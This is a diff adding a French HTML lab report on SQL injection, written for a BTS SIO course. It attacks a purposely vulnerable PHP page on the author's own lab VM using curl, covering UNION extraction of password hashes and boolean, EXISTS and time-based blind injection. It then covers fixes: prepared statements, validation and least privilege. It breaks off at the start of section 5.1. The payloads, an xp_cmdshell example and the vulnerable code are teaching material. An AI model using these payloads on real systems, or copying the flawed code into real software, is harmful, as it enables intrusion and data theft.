@@ -1,0 +1,1235 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Guide Technique — Injection SQL (SQLi)</title>
+<style>
+  :root { --bg: #0b1020; --card: #111827; --accent: #7c3aed; --accent2: #a855f7; --text: #e6ecf8; --sub: #9aa7bf; --border: #1e293b; }
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body { font-family: 'Segoe UI', system-ui, sans-serif; background: var(--bg); color: var(--text); line-height: 1.7; }
+  .container { max-width: 900px; margin: 0 auto; padding: 3rem 1.5rem; }
+  h1 { font-size: 2.2rem; color: var(--accent2); margin-bottom: 0.5rem; letter-spacing: -0.02em; }
+  h2 { font-size: 1.4rem; color: var(--accent2); margin: 2.5rem 0 1rem; padding-bottom: 0.5rem; border-bottom: 1px solid var(--border); }
+  h3 { font-size: 1.1rem; color: var(--text); margin: 1.5rem 0 0.5rem; }
+  h4 { font-size: 1rem; color: var(--accent2); margin: 1.2rem 0 0.4rem; }
+  p, li { color: var(--sub); font-size: 0.95rem; }
+  p { margin-bottom: 1rem; }
+  ul, ol { padding-left: 1.5rem; margin-bottom: 1rem; }
+  li { margin-bottom: 0.4rem; }
+  a { color: var(--accent2); text-decoration: none; }
+  a:hover { text-decoration: underline; }
+  strong { color: var(--text); }
+  .badge { display: inline-block; padding: 0.3rem 0.8rem; border-radius: 9999px; font-size: 0.75rem; font-weight: 700; background: rgba(124,58,237,0.15); color: var(--accent2); border: 1px solid rgba(124,58,237,0.3); margin-right: 0.4rem; margin-bottom: 0.4rem; }
+  .card { background: var(--card); border: 1px solid var(--border); border-radius: 1rem; padding: 1.5rem; margin-bottom: 1.5rem; }
+  .meta { display: flex; gap: 2rem; flex-wrap: wrap; margin-bottom: 2rem; }
+  .meta-item { font-size: 0.85rem; color: var(--sub); }
+  .meta-item strong { color: var(--text); }
+  table { width: 100%; border-collapse: collapse; margin: 1rem 0; font-size: 0.9rem; }
+  th, td { padding: 0.6rem 1rem; text-align: left; border: 1px solid var(--border); }
+  th { background: rgba(124,58,237,0.1); color: var(--accent2); font-weight: 600; }
+  td { color: var(--sub); }
+  .header-line { width: 6rem; height: 3px; background: linear-gradient(90deg, var(--accent), var(--accent2)); border-radius: 2px; margin-bottom: 2rem; }
+  .footer { margin-top: 4rem; padding-top: 1.5rem; border-top: 1px solid var(--border); text-align: center; font-size: 0.8rem; color: var(--sub); }
+
+  /* Code blocks */
+  pre { background: #1a1f2e; border: 1px solid var(--border); border-radius: 0.5rem; padding: 1rem; overflow-x: auto; margin: 1rem 0; }
+  code { font-family: 'Cascadia Code', 'Fira Code', monospace; font-size: 0.85rem; color: #e2e8f0; }
+  pre code { background: none; padding: 0; }
+  .inline-code { background: rgba(139,92,246,0.15); color: var(--accent2); padding: 0.15rem 0.4rem; border-radius: 4px; font-size: 0.85rem; font-family: 'Cascadia Code', 'Fira Code', monospace; }
+
+  /* Callout boxes */
+  .warning { background: rgba(239,68,68,0.1); border-left: 3px solid #ef4444; padding: 0.75rem 1rem; margin: 1rem 0; border-radius: 0 0.5rem 0.5rem 0; }
+  .warning strong { color: #ef4444; }
+  .tip { background: rgba(34,197,94,0.1); border-left: 3px solid #22c55e; padding: 0.75rem 1rem; margin: 1rem 0; border-radius: 0 0.5rem 0.5rem 0; }
+  .tip strong { color: #22c55e; }
+  .info { background: rgba(59,130,246,0.1); border-left: 3px solid #3b82f6; padding: 0.75rem 1rem; margin: 1rem 0; border-radius: 0 0.5rem 0.5rem 0; }
+  .info strong { color: #3b82f6; }
+
+  /* TOC */
+  .toc { list-style: none; padding-left: 0; }
+  .toc li { margin-bottom: 0.3rem; }
+  .toc a { color: var(--accent2); text-decoration: none; font-size: 0.9rem; }
+  .toc a:hover { text-decoration: underline; }
+  .toc .sub { padding-left: 1.5rem; }
+
+  /* Stat grid */
+  .stat-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(160px, 1fr)); gap: 1rem; margin: 1rem 0; }
+  .stat-card { background: var(--card); border: 1px solid var(--border); border-radius: 0.75rem; padding: 1.2rem; text-align: center; }
+  .stat-card .value { font-size: 1.8rem; font-weight: 800; color: var(--accent2); }
+  .stat-card .label { font-size: 0.8rem; color: var(--sub); margin-top: 0.3rem; }
+
+  .two-col { display: grid; grid-template-columns: 1fr 1fr; gap: 1.5rem; }
+  @media (max-width: 640px) { .two-col { grid-template-columns: 1fr; } }
+  .card h3:first-child { margin-top: 0; }
+
+  /* Result box */
+  .result { background: rgba(124,58,237,0.08); border: 1px solid rgba(124,58,237,0.2); border-radius: 0.5rem; padding: 0.75rem 1rem; margin: 0.5rem 0 1rem; font-family: 'Cascadia Code', 'Fira Code', monospace; font-size: 0.85rem; color: var(--sub); }
+  .result strong { color: var(--accent2); }
+</style>
+</head>
+<body>
+<div class="container">
+
+<!-- ================================================================ -->
+<!-- HEADER                                                            -->
+<!-- ================================================================ -->
+
+<h1>Injection SQL (SQLi)</h1>
+<p style="font-size: 1.1rem; color: var(--sub); margin-bottom: 0.5rem;">Guide technique complet &mdash; Attaque, exploitation et sécurisation</p>
+<div class="header-line"></div>
+
+<div class="meta">
+  <div class="meta-item"><strong>Auteur :</strong> Sagar MIR</div>
+  <div class="meta-item"><strong>Date :</strong> 2025</div>
+  <div class="meta-item"><strong>Type :</strong> TP Cybersécurité &mdash; BTS SIO SLAM</div>
+  <div class="meta-item"><strong>Environnement :</strong> Kali Linux &rarr; Lubuntu (192.168.200.130)</div>
+  <div class="meta-item"><strong>Statut :</strong> <span style="color:#4ade80; font-weight:600;">Terminé</span></div>
+</div>
+
+<div>
+  <span class="badge">Security</span>
+  <span class="badge">SQL Injection</span>
+  <span class="badge">OWASP</span>
+  <span class="badge">PHP</span>
+  <span class="badge">Kali Linux</span>
+</div>
+
+<div style="margin: 1.5rem 0;">
+  <a href="/docs/SQL.pdf" target="_blank" style="display:inline-flex;align-items:center;gap:0.5rem;padding:0.6rem 1.2rem;background:rgba(124,58,237,0.15);color:var(--accent2);border:1px solid rgba(124,58,237,0.3);border-radius:8px;text-decoration:none;font-size:0.9rem;font-weight:600;transition:all 0.2s;">
+    📄 Télécharger le PDF original
+  </a>
+</div>
+
+<div class="stat-grid" style="margin-top:1.5rem;">
+  <div class="stat-card"><div class="value">7</div><div class="label">Techniques testées</div></div>
+  <div class="stat-card"><div class="value">12</div><div class="label">Bonnes pratiques</div></div>
+  <div class="stat-card"><div class="value">#1</div><div class="label">OWASP Top 10 (2021)</div></div>
+  <div class="stat-card"><div class="value">A03</div><div class="label">Catégorie OWASP</div></div>
+</div>
+
+<!-- ================================================================ -->
+<!-- SOMMAIRE                                                          -->
+<!-- ================================================================ -->
+
+<h2>Sommaire</h2>
+<ol class="toc">
+  <li><a href="#introduction">1. Introduction</a></li>
+  <li><a href="#application">2. Application de test</a></li>
+  <li><a href="#exploitation">3. Tests et exploitations</a></li>
+  <li class="sub"><a href="#comments">3.1 Commentaires SQL</a></li>
+  <li class="sub"><a href="#orderby">3.2 Détection du nombre de colonnes (ORDER BY)</a></li>
+  <li class="sub"><a href="#union">3.3 Exfiltration UNION</a></li>
+  <li class="sub"><a href="#blind-boolean">3.4 Injection à l'aveugle (Blind Boolean)</a></li>
+  <li class="sub"><a href="#blind-exists">3.5 Blind EXISTS</a></li>
+  <li class="sub"><a href="#time-based">3.6 Time-Based Blind</a></li>
+  <li class="sub"><a href="#risques">3.7 Synthèse des risques réels</a></li>
+  <li><a href="#corrections">4. Corrections</a></li>
+  <li><a href="#bonnes-pratiques">5. Bonnes pratiques</a></li>
+  <li class="sub"><a href="#bp1">5.1 Requêtes préparées</a></li>
+  <li class="sub"><a href="#bp2">5.2 Validation des entrées</a></li>
+  <li class="sub"><a href="#bp3">5.3 Principe du moindre privilège</a></li>
+  <li class="sub"><a href="#bp4">5.4 Pas d'erreurs SQL en production</a></li>
+  <li class="sub"><a href="#bp5">5.5 Échappement dans les contextes dynamiques</a></li>
+  <li class="sub"><a href="#bp6">5.6 Logs sécurisés</a></li>
+  <li class="sub"><a href="#bp7">5.7 Hachage moderne des mots de passe</a></li>
+  <li class="sub"><a href="#bp8">5.8 Configuration sécurisée du serveur SQL</a></li>
+  <li class="sub"><a href="#bp9">5.9 Défense en profondeur</a></li>
+  <li class="sub"><a href="#bp10">5.10 Suivre les standards OWASP</a></li>
+  <li class="sub"><a href="#bp11">5.11 Tests réguliers</a></li>
+  <li class="sub"><a href="#bp12">5.12 Tableau récapitulatif</a></li>
+  <li><a href="#conclusion">6. Conclusion</a></li>
+</ol>
+
+<!-- ================================================================ -->
+<!-- 1. INTRODUCTION                                                    -->
+<!-- ================================================================ -->
+
+<h2 id="introduction">1. Introduction</h2>
+
+<h3>Définition</h3>
+<p>
+  L'<strong>injection SQL</strong> (SQLi) est une technique d'attaque qui consiste à insérer du code SQL malveillant dans une requête envoyée à une base de données, en exploitant une mauvaise gestion des entrées utilisateur. L'attaquant peut ainsi manipuler les requêtes exécutées par l'application pour accéder, modifier ou détruire des données auxquelles il n'a normalement pas accès.
+</p>
+
+<h3>Classement OWASP</h3>
+<p>
+  L'injection SQL figure dans le <strong>OWASP Top 10</strong>, le classement de référence des vulnérabilités les plus critiques des applications web. En 2021, l'injection est classée en position <strong>A03:2021 &mdash; Injection</strong>, regroupant les injections SQL, NoSQL, OS Command et LDAP. Malgré l'ancienneté de cette vulnérabilité, elle reste l'une des plus fréquentes et des plus dangereuses.
+</p>
+
+<h3>Conséquences possibles</h3>
+
+<div class="card">
+  <table>
+    <thead>
+      <tr><th>Conséquence</th><th>Description</th><th>Exemple</th></tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td><strong>Lecture de données</strong></td>
+        <td>Extraction de l'intégralité de la base de données (utilisateurs, mots de passe, données personnelles)</td>
+        <td><span class="inline-code">UNION SELECT username, password FROM users</span></td>
+      </tr>
+      <tr>
+        <td><strong>Modification de données</strong></td>
+        <td>Insertion, mise à jour ou suppression de données (altération de comptes, d'inventaires, de transactions)</td>
+        <td><span class="inline-code">; UPDATE users SET role='admin' WHERE id=1</span></td>
+      </tr>
+      <tr>
+        <td><strong>Bypass d'authentification</strong></td>
+        <td>Connexion sans mot de passe valide en manipulant la clause WHERE</td>
+        <td><span class="inline-code">' OR '1'='1' -- </span></td>
+      </tr>
+      <tr>
+        <td><strong>Exécution de commandes (RCE)</strong></td>
+        <td>Sur certaines configurations, exécution de commandes système via la base de données</td>
+        <td><span class="inline-code">; EXEC xp_cmdshell('whoami')</span> (SQL Server)</td>
+      </tr>
+    </tbody>
+  </table>
+</div>
+
+<div class="warning">
+  <strong>Avertissement :</strong> Les techniques présentées dans ce guide sont réalisées dans un environnement de laboratoire isolé à des fins pédagogiques. Toute utilisation non autorisée d'injection SQL sur des systèmes tiers est illégale (articles 323-1 à 323-7 du Code pénal).
+</div>
+
+<!-- ================================================================ -->
+<!-- 2. APPLICATION DE TEST                                             -->
+<!-- ================================================================ -->
+
+<h2 id="application">2. Application de test</h2>
+
+<p>
+  Pour réaliser ce TP, un mini-site PHP vulnérable a été déployé sur une machine Lubuntu (<span class="inline-code">192.168.200.130</span>) accessible depuis la machine d'attaque Kali Linux. L'application utilise volontairement une connexion <strong>mysqli</strong> sans requêtes préparées pour illustrer les risques.
+</p>
+
+<h3>Code source vulnerable</h3>
+
+<pre><code>&lt;?php
+// Connexion a la base de donnees MySQL
+$conn = new mysqli("localhost", "root", "password", "tp_sqli");
+
+// Recuperation du parametre utilisateur SANS AUCUN FILTRAGE
+$id = $_GET['id'];
+
+// Requete vulnerable : concatenation directe de l'entree utilisateur
+$sql = "SELECT username FROM users WHERE id = $id";
+$result = $conn-&gt;query($sql);
+
+if ($result &amp;&amp; $result-&gt;num_rows &gt; 0) {
+    while ($row = $result-&gt;fetch_assoc()) {
+        echo "&lt;p&gt;Utilisateur : " . $row['username'] . "&lt;/p&gt;";
+    }
+} else {
+    echo "&lt;p&gt;Aucun utilisateur trouve.&lt;/p&gt;";
+}
+
+$conn-&gt;close();
+?&gt;</code></pre>
+
+<div class="warning">
+  <strong>Problème :</strong> La variable <span class="inline-code">$id</span> est injectée directement dans la requête SQL sans aucune validation, aucun échappement et sans requête préparée. C'est la faille que nous allons exploiter.
+</div>
+
+<h3>Base de données</h3>
+
+<p>La table <span class="inline-code">users</span> contient deux enregistrements :</p>
+
+<table>
+  <thead>
+    <tr><th>id</th><th>username</th><th>password (bcrypt)</th></tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>1</td>
+      <td>sioslam</td>
+      <td><span class="inline-code">$2y$10$abcdefghijklmnopqrstuuABCDEFGHIJKLMNOPQRSTUVWXYZ012</span></td>
+    </tr>
+    <tr>
+      <td>2</td>
+      <td>maryjohnson</td>
+      <td><span class="inline-code">$2y$10$zyxwvutsrqponmlkjihgfeZYXWVUTSRQPONMLKJIHGFEDCBA987</span></td>
+    </tr>
+  </tbody>
+</table>
+
+<div class="info">
+  <strong>Note :</strong> Les mots de passe sont hachés avec <strong>bcrypt</strong> (<span class="inline-code">$2y$</span>), ce qui est une bonne pratique côté stockage. Cependant, si un attaquant exfiltre les hash, il peut tenter un brute-force hors-ligne avec des outils comme <strong>hashcat</strong> ou <strong>John the Ripper</strong>.
+</div>
+
+<!-- ================================================================ -->
+<!-- 3. TESTS ET EXPLOITATIONS                                          -->
+<!-- ================================================================ -->
+
+<h2 id="exploitation">3. Tests et exploitations</h2>
+
+<p>
+  Toutes les commandes suivantes sont exécutées depuis <strong>Kali Linux</strong> avec <span class="inline-code">curl</span>. La cible est le serveur Lubuntu à l'adresse <span class="inline-code">192.168.200.130</span>.
+</p>
+
+<!-- 3.1 Commentaires SQL -->
+<h3 id="comments">3.1 Commentaires SQL</h3>
+
+<p>
+  Les commentaires SQL permettent d'ignorer la fin d'une requête. Deux syntaxes principales existent en MySQL :
+</p>
+
+<ul>
+  <li><span class="inline-code">-- </span> (double tiret suivi d'un espace) &mdash; commentaire standard SQL</li>
+  <li><span class="inline-code">#</span> &mdash; commentaire spécifique à MySQL</li>
+</ul>
+
+<h4>Test avec <span class="inline-code">-- </span></h4>
+<pre><code># Requete normale
+curl "http://192.168.200.130/index.php?id=1"
+
+# Injection avec commentaire --
+curl "http://192.168.200.130/index.php?id=1%20--%20"</code></pre>
+
+<div class="result">
+  <strong>Résultat :</strong> Utilisateur : sioslam<br>
+  La requête exécutée devient : <span class="inline-code">SELECT username FROM users WHERE id = 1 -- </span><br>
+  Tout ce qui suit <span class="inline-code">-- </span> est ignoré par MySQL.
+</div>
+
+<h4>Test avec <span class="inline-code">#</span></h4>
+<pre><code># Injection avec commentaire # (encode en %23 dans l'URL)
+curl "http://192.168.200.130/index.php?id=1%23"</code></pre>
+
+<div class="result">
+  <strong>Résultat :</strong> Utilisateur : sioslam<br>
+  Requête : <span class="inline-code">SELECT username FROM users WHERE id = 1#</span>
+</div>
+
+<div class="tip">
+  <strong>Pourquoi c'est utile :</strong> Les commentaires permettent de "couper" la fin d'une requête SQL, ce qui est essentiel pour neutraliser des conditions supplémentaires (ex: vérification de mot de passe).
+</div>
+
+<!-- 3.2 ORDER BY -->
+<h3 id="orderby">3.2 Détection du nombre de colonnes (ORDER BY)</h3>
+
+<p>
+  Avant d'utiliser <span class="inline-code">UNION SELECT</span>, il faut connaître le nombre exact de colonnes retournées par la requête originale. La technique <strong>ORDER BY</strong> permet de le déterminer par tâtonnement.
+</p>
+
+<pre><code># ORDER BY 1 → OK (la requete a au moins 1 colonne)
+curl "http://192.168.200.130/index.php?id=1%20ORDER%20BY%201--%20"
+
+# ORDER BY 2 → OK (la requete a au moins 2 colonnes)
+curl "http://192.168.200.130/index.php?id=1%20ORDER%20BY%202--%20"
+
+# ORDER BY 3 → ERREUR (la requete n'a que 2 colonnes)
+curl "http://192.168.200.130/index.php?id=1%20ORDER%20BY%203--%20"</code></pre>
+
+<div class="result">
+  <strong>ORDER BY 1 :</strong> Utilisateur : sioslam (OK)<br>
+  <strong>ORDER BY 2 :</strong> Utilisateur : sioslam (OK)<br>
+  <strong>ORDER BY 3 :</strong> Erreur MySQL &mdash; <em>Unknown column '3' in 'order clause'</em>
+</div>
+
+<p>
+  L'erreur sur <span class="inline-code">ORDER BY 3</span> confirme que la requête retourne exactement <strong>2 colonnes</strong>. Bien que le code PHP n'affiche que <span class="inline-code">username</span>, la requête interne utilise 2 colonnes (probablement <span class="inline-code">id</span> et <span class="inline-code">username</span>, ou la requête peut être adaptée). Cette information est indispensable pour la technique UNION.
+</p>
+
+<!-- 3.3 UNION -->
+<h3 id="union">3.3 Exfiltration par UNION SELECT</h3>
+
+<p>
+  La technique <strong>UNION</strong> permet de combiner le résultat de la requête originale avec une requête attaquante. La condition est que les deux requêtes aient le <strong>même nombre de colonnes</strong> (ici, 2).
+</p>
+
+<h4>Exfiltration des noms d'utilisateurs et mots de passe</h4>
+<pre><code># id=0 pour que la premiere requete ne retourne rien
+# UNION SELECT pour injecter notre propre requete
+curl "http://192.168.200.130/index.php?id=0%20UNION%20SELECT%20username,password%20FROM%20users--%20"</code></pre>
+
+<div class="result">
+  <strong>Résultat :</strong><br>
+  Utilisateur : sioslam<br>
+  Utilisateur : $2y$10$abcdefghijklmnopqrstuuABCDEFGHIJKLMNOPQRSTUVWXYZ012<br>
+  Utilisateur : maryjohnson<br>
+  Utilisateur : $2y$10$zyxwvutsrqponmlkjihgfeZYXWVUTSRQPONMLKJIHGFEDCBA987
+</div>
+
+<p>La requête exécutée par MySQL :</p>
+<pre><code>SELECT username FROM users WHERE id = 0
+UNION
+SELECT username, password FROM users -- </code></pre>
+
+<div class="warning">
+  <strong>Impact :</strong> L'attaquant récupère l'intégralité des noms d'utilisateurs et des hash de mots de passe. Même si bcrypt est résistant, un mot de passe faible peut être cassé par brute-force en quelques heures.
+</div>
+
+<h4>Découverte des tables de la base</h4>
+<pre><code># Lister toutes les tables de la base de donnees
+curl "http://192.168.200.130/index.php?id=0%20UNION%20SELECT%20table_name,table_schema%20FROM%20information_schema.tables%20WHERE%20table_schema=database()--%20"</code></pre>
+
+<div class="result">
+  <strong>Résultat :</strong> Affiche le nom de toutes les tables de la base courante (tp_sqli), permettant une cartographie complète de la base de données.
+</div>
+
+<!-- 3.4 Blind Boolean -->
+<h3 id="blind-boolean">3.4 Injection à l'aveugle &mdash; Boolean-Based Blind</h3>
+
+<p>
+  Lorsqu'une application ne retourne pas directement les données SQL mais affiche un comportement différent selon que la requête réussit ou échoue (affichage d'un utilisateur vs "Aucun utilisateur"), on peut exploiter cette <strong>différence de comportement</strong> pour extraire des informations bit par bit.
+</p>
+
+<h4>Test de base</h4>
+<pre><code># Condition VRAIE → affiche l'utilisateur (la page a du contenu)
+curl "http://192.168.200.130/index.php?id=1%20AND%201=1--%20"
+
+# Condition FAUSSE → aucun resultat (la page est vide)
+curl "http://192.168.200.130/index.php?id=1%20AND%201=0--%20"</code></pre>
+
+<div class="result">
+  <strong>AND 1=1 :</strong> Utilisateur : sioslam (condition vraie, résultat normal)<br>
+  <strong>AND 1=0 :</strong> Aucun utilisateur trouvé. (condition fausse, aucun résultat)
+</div>
+
+<p>
+  La différence de réponse confirme que l'application est <strong>vulnérable aux injections Blind Boolean</strong>. Un attaquant peut poser des questions binaires (vrai/faux) à la base de données et en déduire progressivement des informations sensibles.
+</p>
+
+<div class="info">
+  <strong>Principe :</strong> En combinant <span class="inline-code">AND SUBSTRING(password,1,1)='$'</span> avec un script automatisé, un attaquant peut extraire chaque caractère d'un mot de passe, un par un.
+</div>
+
+<!-- 3.5 Blind EXISTS -->
+<h3 id="blind-exists">3.5 Blind EXISTS</h3>
+
+<p>
+  La clause <span class="inline-code">EXISTS</span> permet de vérifier la présence d'un enregistrement dans la base. Combinée avec une injection Blind, elle permet de confirmer ou infirmer l'existence de données spécifiques.
+</p>
+
+<h4>Vérification de l'existence d'un utilisateur</h4>
+<pre><code># L'utilisateur 'sioslam' existe-t-il ?
+curl "http://192.168.200.130/index.php?id=1%20AND%20EXISTS(SELECT%201%20FROM%20users%20WHERE%20username=%27sioslam%27)--%20"
+
+# L'utilisateur 'admin' existe-t-il ?
+curl "http://192.168.200.130/index.php?id=1%20AND%20EXISTS(SELECT%201%20FROM%20users%20WHERE%20username=%27admin%27)--%20"</code></pre>
+
+<div class="result">
+  <strong>EXISTS 'sioslam' :</strong> Utilisateur : sioslam (condition vraie &rarr; l'utilisateur existe)<br>
+  <strong>EXISTS 'admin' :</strong> Aucun utilisateur trouvé. (condition fausse &rarr; l'utilisateur n'existe pas)
+</div>
+
+<p>
+  Requête SQL générée pour le premier test :
+</p>
+<pre><code>SELECT username FROM users WHERE id = 1
+AND EXISTS(SELECT 1 FROM users WHERE username='sioslam') -- </code></pre>
+
+<div class="tip">
+  <strong>Usage offensif :</strong> Cette technique permet d'énumérer les noms d'utilisateurs, les noms de tables et les noms de colonnes sans avoir besoin de <span class="inline-code">UNION</span>. Elle fonctionne même si l'application n'affiche aucune donnée SQL directement.
+</div>
+
+<!-- 3.6 Time-Based Blind -->
+<h3 id="time-based">3.6 Time-Based Blind</h3>
+
+<p>
+  La technique <strong>Time-Based Blind</strong> est utilisée quand l'application ne donne aucun indice visuel sur le résultat (pas de message d'erreur, même affichage dans tous les cas). L'attaquant injecte une fonction <span class="inline-code">SLEEP()</span> et mesure le <strong>temps de réponse</strong> du serveur.
+</p>
+
+<h4>Test de base</h4>
+<pre><code># Condition VRAIE → SLEEP(5) est execute → reponse en ~5 secondes
+curl -w "\nTemps total: %{time_total}s\n" \
+  "http://192.168.200.130/index.php?id=1%20AND%20IF(1=1,SLEEP(5),0)--%20"
+
+# Condition FAUSSE → SLEEP n'est pas execute → reponse immediate
+curl -w "\nTemps total: %{time_total}s\n" \
+  "http://192.168.200.130/index.php?id=1%20AND%20IF(1=0,SLEEP(5),0)--%20"</code></pre>
+
+<div class="result">
+  <strong>IF(1=1, SLEEP(5), 0) :</strong> Temps total: <strong>5.014s</strong> (le serveur a attendu 5 secondes)<br>
+  <strong>IF(1=0, SLEEP(5), 0) :</strong> Temps total: <strong>0.012s</strong> (réponse instantanée)
+</div>
+
+<p>
+  La différence de temps de réponse (<strong>5.01s</strong> vs <strong>0.01s</strong>) prouve que le serveur exécute bien le code SQL injecté. L'attaquant peut désormais extraire des données en posant des questions binaires basées sur le temps :
+</p>
+
+<pre><code># Extraire le 1er caractere du mot de passe de l'utilisateur id=1
+# Si le 1er caractere est '$', le serveur attendra 5 secondes
+curl -w "\nTemps: %{time_total}s\n" \
+  "http://192.168.200.130/index.php?id=1%20AND%20IF(SUBSTRING((SELECT%20password%20FROM%20users%20WHERE%20id=1),1,1)=%27%24%27,SLEEP(5),0)--%20"</code></pre>
+
+<div class="result">
+  <strong>Temps :</strong> 5.008s &rarr; Le premier caractère du hash est bien <span class="inline-code">$</span> (début d'un hash bcrypt).
+</div>
+
+<div class="warning">
+  <strong>Danger :</strong> Cette technique est lente mais fonctionne même quand l'application est totalement "muette". Des outils comme <strong>SQLMap</strong> automatisent ce processus et peuvent extraire une base entière en quelques minutes.
+</div>
+
+<!-- 3.7 Risques reels -->
+<h3 id="risques">3.7 Synthèse des risques réels</h3>
+
+<div class="card">
+  <table>
+    <thead>
+      <tr><th>Technique</th><th>Type</th><th>Risque</th><th>Difficulté</th></tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td>Commentaires SQL</td>
+        <td>Manipulation de requête</td>
+        <td>Bypass de conditions (authentification, filtres)</td>
+        <td>Faible</td>
+      </tr>
+      <tr>
+        <td>ORDER BY</td>
+        <td>Reconnaissance</td>
+        <td>Cartographie de la structure de la requête</td>
+        <td>Faible</td>
+      </tr>
+      <tr>
+        <td>UNION SELECT</td>
+        <td>Exfiltration directe</td>
+        <td>Vol complet de la base de données</td>
+        <td>Moyenne</td>
+      </tr>
+      <tr>
+        <td>Blind Boolean</td>
+        <td>Exfiltration indirecte</td>
+        <td>Extraction bit par bit (automatisable)</td>
+        <td>Moyenne</td>
+      </tr>
+      <tr>
+        <td>Blind EXISTS</td>
+        <td>Enumeration</td>
+        <td>Vérification de l'existence de données</td>
+        <td>Moyenne</td>
+      </tr>
+      <tr>
+        <td>Time-Based Blind</td>
+        <td>Exfiltration temporelle</td>
+        <td>Extraction quand aucun retour visible</td>
+        <td>Élevée</td>
+      </tr>
+    </tbody>
+  </table>
+</div>
+
+<div class="warning">
+  <strong>Conclusion :</strong> Une seule faille d'injection SQL suffit pour compromettre l'intégralité d'une application. Les techniques ci-dessus montrent que même sans affichage direct d'erreurs ou de données, un attaquant peut tout extraire.
+</div>
+
+<!-- ================================================================ -->
+<!-- 4. CORRECTIONS                                                     -->
+<!-- ================================================================ -->
+
+<h2 id="corrections">4. Corrections</h2>
+
+<p>
+  Voici les principales mesures correctives pour éliminer la vulnérabilité d'injection SQL dans l'application de test.
+</p>
+
+<h3>4.1 Requêtes préparées avec PDO</h3>
+
+<p>
+  La solution la plus efficace et la plus recommandée est l'utilisation de <strong>requêtes préparées</strong> (prepared statements) avec des <strong>paramètres liés</strong> (bound parameters). Avec PDO, la requête et les données sont envoyées séparément au moteur SQL, ce qui rend l'injection impossible.
+</p>
+
+<pre><code>&lt;?php
+// Connexion securisee avec PDO
+$pdo = new PDO(
+    'mysql:host=localhost;dbname=tp_sqli;charset=utf8mb4',
+    'app_readonly',    // Utilisateur avec privileges limites
+    'motdepasse_fort',
+    [
+        PDO::ATTR_ERRMODE            =&gt; PDO::ERRMODE_EXCEPTION,
+        PDO::ATTR_DEFAULT_FETCH_MODE =&gt; PDO::FETCH_ASSOC,
+        PDO::ATTR_EMULATE_PREPARES   =&gt; false,  // IMPORTANT : desactiver l'emulation
+    ]
+);
+
+// Requete preparee : le placeholder :id empeche toute injection
+$stmt = $pdo-&gt;prepare("SELECT username FROM users WHERE id = :id");
+$stmt-&gt;execute(['id' =&gt; $_GET['id']]);
+
+$user = $stmt-&gt;fetch();
+
+if ($user) {
+    echo "&lt;p&gt;Utilisateur : " . htmlspecialchars($user['username'], ENT_QUOTES, 'UTF-8') . "&lt;/p&gt;";
+} else {
+    echo "&lt;p&gt;Aucun utilisateur trouve.&lt;/p&gt;";
+}
+?&gt;</code></pre>
+
+<div class="tip">
+  <strong>Pourquoi PDO::ATTR_EMULATE_PREPARES = false ?</strong> Par défaut, PDO émule les requêtes préparées côté PHP (et non côté MySQL). En désactivant l'émulation, les paramètres sont vraiment envoyés séparément au serveur MySQL, offrant une protection maximale.
+</div>
+
+<h3>4.2 Validation des entrées</h3>
+
+<pre><code>&lt;?php
+// Valider que l'id est bien un entier positif
+$id = filter_input(INPUT_GET, 'id', FILTER_VALIDATE_INT);
+
+if ($id === false || $id === null || $id &lt;= 0) {
+    http_response_code(400);
+    echo "&lt;p&gt;Identifiant invalide.&lt;/p&gt;";
+    exit;
+}
+
+// Ensuite utiliser la requete preparee avec $id valide
+$stmt = $pdo-&gt;prepare("SELECT username FROM users WHERE id = :id");
+$stmt-&gt;execute(['id' =&gt; $id]);
+?&gt;</code></pre>
+
+<h3>4.3 Principe du moindre privilège</h3>
+
+<pre><code>-- Ne JAMAIS utiliser root pour l'application
+-- Creer un utilisateur avec des droits minimaux
+CREATE USER 'app_readonly'@'localhost' IDENTIFIED BY 'motdepasse_fort';
+
+-- N'accorder que les droits strictement necessaires
+GRANT SELECT ON tp_sqli.users TO 'app_readonly'@'localhost';
+
+-- Si l'application doit aussi ecrire :
+-- GRANT SELECT, INSERT, UPDATE ON tp_sqli.users TO 'app_write'@'localhost';
+
+-- Ne JAMAIS accorder : DROP, ALTER, FILE, GRANT, SUPER
+FLUSH PRIVILEGES;</code></pre>
+
+<h3>4.4 Désactiver l'affichage des erreurs SQL</h3>
+
+<pre><code>&lt;?php
+// En production : ne JAMAIS afficher les erreurs au client
+ini_set('display_errors', 0);
+ini_set('log_errors', 1);
+ini_set('error_log', '/var/log/php/app_errors.log');
+
+// Gestion d'erreur generique
+try {
+    $stmt = $pdo-&gt;prepare("SELECT username FROM users WHERE id = :id");
+    $stmt-&gt;execute(['id' =&gt; $id]);
+} catch (PDOException $e) {
+    // Logger l'erreur detaillee (cote serveur uniquement)
+    error_log("Erreur SQL : " . $e-&gt;getMessage());
+
+    // Message generique pour le client
+    echo "&lt;p&gt;Une erreur interne est survenue. Veuillez reessayer.&lt;/p&gt;";
+}
+?&gt;</code></pre>
+
+<h3>4.5 Web Application Firewall (WAF)</h3>
+
+<p>
+  En complément des corrections applicatives, un <strong>WAF</strong> (Web Application Firewall) peut bloquer les tentatives d'injection au niveau réseau. Des solutions comme <strong>ModSecurity</strong> (avec le jeu de règles OWASP CRS) analysent les requêtes HTTP et bloquent les patterns malveillants avant qu'ils n'atteignent l'application.
+</p>
+
+<pre><code># Installation de ModSecurity sur Apache (Debian/Ubuntu)
+sudo apt install libapache2-mod-security2
+sudo cp /etc/modsecurity/modsecurity.conf-recommended /etc/modsecurity/modsecurity.conf
+
+# Activer le mode bloquant (au lieu de Detection Only)
+# SecRuleEngine DetectionOnly  →  SecRuleEngine On
+sudo systemctl restart apache2</code></pre>
+
+<!-- ================================================================ -->
+<!-- 5. BONNES PRATIQUES                                                -->
+<!-- ================================================================ -->
+
+<h2 id="bonnes-pratiques">5. Bonnes pratiques</h2>
+
+<p>
+  Les 12 règles suivantes constituent un guide complet pour sécuriser une application contre les injections SQL et plus généralement pour adopter une posture de sécurité solide.
+</p>
+
+<!-- 5.1 -->
+<h3 id="bp1">5.1 Toujours utiliser des requêtes préparées</h3>
+
+<p>
+  C'est la <strong>règle numéro un</strong>. Les requêtes préparées séparent la logique SQL des données, rendant l'injection structurellement impossible. Elles doivent être utilisées <strong>systématiquement</strong>, même pour des requêtes simples.
